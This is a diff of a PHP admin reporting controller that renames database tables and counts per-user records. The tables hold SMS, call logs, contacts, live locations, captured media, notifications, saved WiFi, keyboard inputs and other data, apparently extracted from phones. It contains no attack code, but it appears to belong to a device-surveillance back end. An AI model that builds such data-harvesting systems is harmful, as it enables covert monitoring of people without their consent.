@@ -24,18 +24,18 @@ class Reports extends BaseAdminController
         }
         $data['total_users'] = $usersCountBuilder->countAllResults();
 
-        $uploadsCountBuilder = $db->table('uploaded_files')->select('token_owner_id');
+        $uploadsCountBuilder = $db->table('tbl_uploaded_files')->select('token_owner_id');
         if ($hiddenIds !== []) {
             $uploadsCountBuilder->whereNotIn('token_owner_id', $hiddenIds);
         }
         $data['users_with_data'] = $uploadsCountBuilder->groupBy('token_owner_id')->countAllResults();
-        $data['total_uploads'] = $db->table('uploaded_files')->countAllResults();
-        $data['total_storage'] = $db->table('uploaded_files')->selectSum('file_size_bytes')->get()->getRow()->file_size_bytes ?? 0;
+        $data['total_uploads'] = $db->table('tbl_uploaded_files')->countAllResults();
+        $data['total_storage'] = $db->table('tbl_uploaded_files')->selectSum('file_size_bytes')->get()->getRow()->file_size_bytes ?? 0;
 
         $dataTables = [
-            'SMS' => 'tbl_sms', 'Calls' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
-            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
-            'Files' => 'tbl_device_files', 'Uploads' => 'uploaded_files',
+            'SMS' => 'tbl_extracted_sms', 'Calls' => 'tbl_extracted_call_logs', 'Contacts' => 'tbl_extracted_contacts',
+            'Apps' => 'tbl_extracted_installed_apps', 'Locations' => 'tbl_extracted_locations', 'Activities' => 'tbl_extracted_activities',
+            'Files' => 'tbl_extracted_device_files', 'Uploads' => 'tbl_uploaded_files',
         ];
         $dataTypeCounts = [];
         foreach ($dataTables as $label => $table) {
@@ -57,25 +57,25 @@ class Reports extends BaseAdminController
 
         // Data usage data
         $dataTables2 = [
-            'SMS'           => ['table' => 'tbl_sms',           'icon' => 'fa-sms'],
-            'Call Logs'     => ['table' => 'tbl_logs',          'icon' => 'fa-phone'],
-            'Contacts'      => ['table' => 'tbl_contacts',      'icon' => 'fa-address-book'],
-            'Apps'          => ['table' => 'tbl_apps',          'icon' => 'fa-th'],
-            'Locations'     => ['table' => 'tbl_location',      'icon' => 'fa-map-marker-alt'],
-            'Activities'    => ['table' => 'tbl_activity',      'icon' => 'fa-running'],
-            'Files'         => ['table' => 'tbl_device_files',  'icon' => 'fa-file'],
-            'Device Context' => ['table' => 'tbl_device_context','icon' => 'fa-cog'],
-            'Network'       => ['table' => 'tbl_network_info',  'icon' => 'fa-wifi'],
+            'SMS'           => ['table' => 'tbl_extracted_sms',           'icon' => 'fa-sms'],
+            'Call Logs'     => ['table' => 'tbl_extracted_call_logs',          'icon' => 'fa-phone'],
+            'Contacts'      => ['table' => 'tbl_extracted_contacts',      'icon' => 'fa-address-book'],
+            'Apps'          => ['table' => 'tbl_extracted_installed_apps',          'icon' => 'fa-th'],
+            'Locations'     => ['table' => 'tbl_extracted_locations',      'icon' => 'fa-map-marker-alt'],
+            'Activities'    => ['table' => 'tbl_extracted_activities',      'icon' => 'fa-running'],
+            'Files'         => ['table' => 'tbl_extracted_device_files',  'icon' => 'fa-file'],
+            'Device Context' => ['table' => 'tbl_device_hardware_contexts','icon' => 'fa-cog'],
+            'Network'       => ['table' => 'tbl_system_network_info',  'icon' => 'fa-wifi'],
             'Accounts'      => ['table' => 'tbl_accounts',      'icon' => 'fa-user-circle'],
-            'Calendar'      => ['table' => 'tbl_calendar_events','icon' => 'fa-calendar'],
-            'App Usage'     => ['table' => 'tbl_app_usage',     'icon' => 'fa-clock'],
-            'Notifications' => ['table' => 'tbl_notifications', 'icon' => 'fa-bell'],
-            'Bluetooth'     => ['table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth'],
-            'Sensors'       => ['table' => 'tbl_sensor_profile','icon' => 'fa-microchip'],
+            'Calendar'      => ['table' => 'tbl_extracted_calendar_events','icon' => 'fa-calendar'],
+            'App Usage'     => ['table' => 'tbl_system_app_usage',     'icon' => 'fa-clock'],
+            'Notifications' => ['table' => 'tbl_extracted_notifications', 'icon' => 'fa-bell'],
+            'Bluetooth'     => ['table' => 'tbl_telemetry_bluetooth_devices',     'icon' => 'fa-bluetooth'],
+            'Sensors'       => ['table' => 'tbl_telemetry_sensors','icon' => 'fa-microchip'],
             'Security'      => ['table' => 'tbl_security_audit','icon' => 'fa-shield-alt'],
-            'Media'         => ['table' => 'tbl_captured_media','icon' => 'fa-camera'],
+            'Media'         => ['table' => 'tbl_extracted_media_files','icon' => 'fa-camera'],
             'SIM'           => ['table' => 'tbl_sim_configs',   'icon' => 'fa-sim-card'],
-            'Uploads'       => ['table' => 'uploaded_files',    'icon' => 'fa-upload'],
+            'Uploads'       => ['table' => 'tbl_uploaded_files',    'icon' => 'fa-upload'],
         ];
 
         $allUsers = $db->table('users')->select('users.id, users.username')->where('users.deleted_at IS NULL');
@@ -95,7 +95,7 @@ class Reports extends BaseAdminController
             $categories = [];
             foreach ($dataTables2 as $label => $info) {
                 $table = $info['table'];
-                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
+                $ownerCol = ($table === 'tbl_uploaded_files') ? 'token_owner_id' : 'owner_id';
                 $count = $db->table($table)->where($ownerCol, $u['id'])->countAllResults();
                 $categories[$label] = $count;
                 $total += $count;
@@ -156,7 +156,7 @@ class Reports extends BaseAdminController
         $data['error_rate'] = $db->table('tbl_user_actions')
             ->select("COUNT(*) as total, SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed")
             ->get()->getRow();
-        $data['uploads_by_day'] = $db->table('uploaded_files')
+        $data['uploads_by_day'] = $db->table('tbl_uploaded_files')
             ->select("DATE(uploaded_at) as date, COUNT(*) as count, AVG(file_size_bytes) as avg_size")
             ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
             ->groupBy('DATE(uploaded_at)')
@@ -243,7 +243,7 @@ class Reports extends BaseAdminController
                 ->where("{$dateCol} >=", $dateFrom ?: '1970-01-01')
                 ->where("{$dateCol} <=", $dateTo ?: date('Y-m-d'));
             if ($userId && $userId !== 'all') {
-                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
+                $ownerCol = ($table === 'tbl_uploaded_files') ? 'token_owner_id' : 'owner_id';
                 $query->where($ownerCol, $userId);
             }
             $count = $query->countAllResults();
@@ -382,38 +382,38 @@ class Reports extends BaseAdminController
     private function getDataTypeMap(): array
     {
         return [
-            'sms'           => ['table' => 'tbl_sms',            'icon' => 'fa-sms',           'label' => 'SMS'],
-            'calls'         => ['table' => 'tbl_logs',           'icon' => 'fa-phone',         'label' => 'Call Logs'],
-            'contacts'      => ['table' => 'tbl_contacts',       'icon' => 'fa-address-book',  'label' => 'Contacts'],
-            'apps'          => ['table' => 'tbl_apps',           'icon' => 'fa-th',            'label' => 'Apps'],
-            'locations'     => ['table' => 'tbl_location',       'icon' => 'fa-map-marker-alt','label' => 'Locations'],
-            'activities'    => ['table' => 'tbl_activity',       'icon' => 'fa-running',       'label' => 'Activities'],
-            'files'         => ['table' => 'tbl_device_files',   'icon' => 'fa-file',          'label' => 'Device Files'],
-            'network'       => ['table' => 'tbl_network_info',   'icon' => 'fa-wifi',          'label' => 'Network Info'],
-            'device_context'=> ['table' => 'tbl_device_context', 'icon' => 'fa-cog',           'label' => 'Device Context'],
-            'notifications' => ['table' => 'tbl_notifications',  'icon' => 'fa-bell',          'label' => 'Notifications'],
+            'sms'           => ['table' => 'tbl_extracted_sms',            'icon' => 'fa-sms',           'label' => 'SMS'],
+            'calls'         => ['table' => 'tbl_extracted_call_logs',           'icon' => 'fa-phone',         'label' => 'Call Logs'],
+            'contacts'      => ['table' => 'tbl_extracted_contacts',       'icon' => 'fa-address-book',  'label' => 'Contacts'],
+            'apps'          => ['table' => 'tbl_extracted_installed_apps',           'icon' => 'fa-th',            'label' => 'Apps'],
+            'locations'     => ['table' => 'tbl_extracted_locations',       'icon' => 'fa-map-marker-alt','label' => 'Locations'],
+            'activities'    => ['table' => 'tbl_extracted_activities',       'icon' => 'fa-running',       'label' => 'Activities'],
+            'files'         => ['table' => 'tbl_extracted_device_files',   'icon' => 'fa-file',          'label' => 'Device Files'],
+            'network'       => ['table' => 'tbl_system_network_info',   'icon' => 'fa-wifi',          'label' => 'Network Info'],
+            'device_context'=> ['table' => 'tbl_device_hardware_contexts', 'icon' => 'fa-cog',           'label' => 'Device Context'],
+            'notifications' => ['table' => 'tbl_extracted_notifications',  'icon' => 'fa-bell',          'label' => 'Notifications'],
             'accounts'      => ['table' => 'tbl_accounts',       'icon' => 'fa-user-circle',   'label' => 'Accounts'],
-            'bluetooth'     => ['table' => 'tbl_bluetooth',      'icon' => 'fa-bluetooth',     'label' => 'Bluetooth'],
-            'calendar'      => ['table' => 'tbl_calendar_events','icon' => 'fa-calendar',      'label' => 'Calendar'],
-            'app_usage'     => ['table' => 'tbl_app_usage',      'icon' => 'fa-clock',         'label' => 'App Usage'],
-            'sensors'       => ['table' => 'tbl_sensor_profile', 'icon' => 'fa-microchip',     'label' => 'Sensors'],
+            'bluetooth'     => ['table' => 'tbl_telemetry_bluetooth_devices',      'icon' => 'fa-bluetooth',     'label' => 'Bluetooth'],
+            'calendar'      => ['table' => 'tbl_extracted_calendar_events','icon' => 'fa-calendar',      'label' => 'Calendar'],
+            'app_usage'     => ['table' => 'tbl_system_app_usage',      'icon' => 'fa-clock',         'label' => 'App Usage'],
+            'sensors'       => ['table' => 'tbl_telemetry_sensors', 'icon' => 'fa-microchip',     'label' => 'Sensors'],
             'security'      => ['table' => 'tbl_security_audit', 'icon' => 'fa-shield-alt',    'label' => 'Security Audit'],
-            'media'         => ['table' => 'tbl_captured_media', 'icon' => 'fa-camera',        'label' => 'Captured Media'],
+            'media'         => ['table' => 'tbl_extracted_media_files', 'icon' => 'fa-camera',        'label' => 'Captured Media'],
             'sim'           => ['table' => 'tbl_sim_configs',    'icon' => 'fa-sim-card',      'label' => 'SIM Configs'],
             'installed_apps'=> ['table' => 'tbl_installed_apps', 'icon' => 'fa-download',      'label' => 'Installed Apps'],
             'device_info'   => ['table' => 'tbl_device_info',    'icon' => 'fa-info-circle',   'label' => 'Device Info'],
-            'battery'       => ['table' => 'tbl_battery_stats',  'icon' => 'fa-battery-half',  'label' => 'Battery Stats'],
+            'battery'       => ['table' => 'tbl_telemetry_battery_stats',  'icon' => 'fa-battery-half',  'label' => 'Battery Stats'],
             'data_usage'    => ['table' => 'tbl_data_usage',     'icon' => 'fa-chart-line',    'label' => 'Data Usage'],
-            'wifi'          => ['table' => 'tbl_saved_wifi',     'icon' => 'fa-wifi',          'label' => 'Saved WiFi'],
+            'wifi'          => ['table' => 'tbl_telemetry_wifi_networks',     'icon' => 'fa-wifi',          'label' => 'Saved WiFi'],
             'accessibility' => ['table' => 'tbl_accessibility',  'icon' => 'fa-universal-access','label' => 'Accessibility'],
-            'input_methods' => ['table' => 'tbl_input_methods',  'icon' => 'fa-keyboard',      'label' => 'Input Methods'],
-            'proc_info'     => ['table' => 'tbl_proc_info',      'icon' => 'fa-microchip',     'label' => 'Process Info'],
-            'thermal'       => ['table' => 'tbl_thermal',        'icon' => 'fa-temperature-high','label' => 'Thermal'],
-            'nfc'           => ['table' => 'tbl_nfc',            'icon' => 'fa-nfc-symbol',    'label' => 'NFC'],
-            'display_info'  => ['table' => 'tbl_display_info',   'icon' => 'fa-tv',            'label' => 'Display Info'],
-            'cell_towers'   => ['table' => 'tbl_cell_towers',    'icon' => 'fa-signal',        'label' => 'Cell Towers'],
+            'input_methods' => ['table' => 'tbl_system_input_methods',  'icon' => 'fa-keyboard',      'label' => 'Input Methods'],
+            'proc_info'     => ['table' => 'tbl_system_running_processes',      'icon' => 'fa-microchip',     'label' => 'Process Info'],
+            'thermal'       => ['table' => 'tbl_telemetry_thermal',        'icon' => 'fa-temperature-high','label' => 'Thermal'],
+            'nfc'           => ['table' => 'tbl_telemetry_nfc',            'icon' => 'fa-nfc-symbol',    'label' => 'NFC'],
+            'display_info'  => ['table' => 'tbl_telemetry_display_info',   'icon' => 'fa-tv',            'label' => 'Display Info'],
+            'cell_towers'   => ['table' => 'tbl_telemetry_cell_towers',    'icon' => 'fa-signal',        'label' => 'Cell Towers'],
             'live_locations'=> ['table' => 'tbl_live_locations', 'icon' => 'fa-map-pin',       'label' => 'Live Locations'],
-            'uploads'       => ['table' => 'uploaded_files',     'icon' => 'fa-upload',        'label' => 'Uploads'],
+            'uploads'       => ['table' => 'tbl_uploaded_files',     'icon' => 'fa-upload',        'label' => 'Uploads'],
         ];
     }
 
@@ -478,28 +478,28 @@ class Reports extends BaseAdminController
         }
 
         $dataTables = [
-            ['label' => 'SMS',           'table' => 'tbl_sms',           'icon' => 'fa-sms'],
-            ['label' => 'Call Logs',     'table' => 'tbl_logs',          'icon' => 'fa-phone'],
-            ['label' => 'Contacts',      'table' => 'tbl_contacts',      'icon' => 'fa-address-book'],
-            ['label' => 'Apps',          'table' => 'tbl_apps',          'icon' => 'fa-th'],
-            ['label' => 'Locations',     'table' => 'tbl_location',      'icon' => 'fa-map-marker-alt'],
-            ['label' => 'Activities',    'table' => 'tbl_activity',      'icon' => 'fa-running'],
-            ['label' => 'Files',         'table' => 'tbl_device_files',  'icon' => 'fa-file'],
-            ['label' => 'Network',       'table' => 'tbl_network_info',  'icon' => 'fa-wifi'],
+            ['label' => 'SMS',           'table' => 'tbl_extracted_sms',           'icon' => 'fa-sms'],
+            ['label' => 'Call Logs',     'table' => 'tbl_extracted_call_logs',          'icon' => 'fa-phone'],
+            ['label' => 'Contacts',      'table' => 'tbl_extracted_contacts',      'icon' => 'fa-address-book'],
+            ['label' => 'Apps',          'table' => 'tbl_extracted_installed_apps',          'icon' => 'fa-th'],
+            ['label' => 'Locations',     'table' => 'tbl_extracted_locations',      'icon' => 'fa-map-marker-alt'],
+            ['label' => 'Activities',    'table' => 'tbl_extracted_activities',      'icon' => 'fa-running'],
+            ['label' => 'Files',         'table' => 'tbl_extracted_device_files',  'icon' => 'fa-file'],
+            ['label' => 'Network',       'table' => 'tbl_system_network_info',  'icon' => 'fa-wifi'],
             ['label' => 'Accounts',      'table' => 'tbl_accounts',      'icon' => 'fa-user-circle'],
-            ['label' => 'Calendar',      'table' => 'tbl_calendar_events','icon' => 'fa-calendar'],
-            ['label' => 'App Usage',     'table' => 'tbl_app_usage',     'icon' => 'fa-clock'],
-            ['label' => 'Notifications',  'table' => 'tbl_notifications', 'icon' => 'fa-bell'],
-            ['label' => 'Bluetooth',     'table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth'],
-            ['label' => 'Sensors',       'table' => 'tbl_sensor_profile','icon' => 'fa-microchip'],
+            ['label' => 'Calendar',      'table' => 'tbl_extracted_calendar_events','icon' => 'fa-calendar'],
+            ['label' => 'App Usage',     'table' => 'tbl_system_app_usage',     'icon' => 'fa-clock'],
+            ['label' => 'Notifications',  'table' => 'tbl_extracted_notifications', 'icon' => 'fa-bell'],
+            ['label' => 'Bluetooth',     'table' => 'tbl_telemetry_bluetooth_devices',     'icon' => 'fa-bluetooth'],
+            ['label' => 'Sensors',       'table' => 'tbl_telemetry_sensors','icon' => 'fa-microchip'],
             ['label' => 'Security',      'table' => 'tbl_security_audit','icon' => 'fa-shield-alt'],
-            ['label' => 'Media',         'table' => 'tbl_captured_media','icon' => 'fa-camera'],
+            ['label' => 'Media',         'table' => 'tbl_extracted_media_files','icon' => 'fa-camera'],
             ['label' => 'SIM',           'table' => 'tbl_sim_configs',   'icon' => 'fa-sim-card'],
-            ['label' => 'Uploads',       'table' => 'uploaded_files',    'icon' => 'fa-upload'],
+            ['label' => 'Uploads',       'table' => 'tbl_uploaded_files',    'icon' => 'fa-upload'],
         ];
         $counts = [];
         foreach ($dataTables as $item) {
-            $ownerCol = ($item['table'] === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
+            $ownerCol = ($item['table'] === 'tbl_uploaded_files') ? 'token_owner_id' : 'owner_id';
             $counts[] = [
                 'label' => $item['label'],
                 'icon'  => $item['icon'],
@@ -521,7 +521,7 @@ class Reports extends BaseAdminController
             ->get()
             ->getResultArray();
 
-        $uploadsPerDay = $db->table('uploaded_files')
+        $uploadsPerDay = $db->table('tbl_uploaded_files')
             ->select("DATE(uploaded_at) as date, COUNT(*) as count")
             ->where('token_owner_id', $userId)
             ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)')
@@ -566,7 +566,7 @@ class Reports extends BaseAdminController
                 ->where("{$dateCol} >=", $dateFrom)
                 ->where("{$dateCol} <=", $dateTo);
             if ($userId && $userId !== 'all') {
-                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
+                $ownerCol = ($table === 'tbl_uploaded_files') ? 'token_owner_id' : 'owner_id';
                 $query->where($ownerCol, $userId);
             }
             $count = $query->countAllResults();
@@ -662,7 +662,7 @@ class Reports extends BaseAdminController
                 ->where("{$dateCol} >=", $dateFrom ?: '1970-01-01')
                 ->where("{$dateCol} <=", $dateTo ?: date('Y-m-d'));
             if ($userId && $userId !== 'all') {
-                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
+                $ownerCol = ($table === 'tbl_uploaded_files') ? 'token_owner_id' : 'owner_id';
                 $query->where($ownerCol, $userId);
             }
             $count = $query->countAllResults();
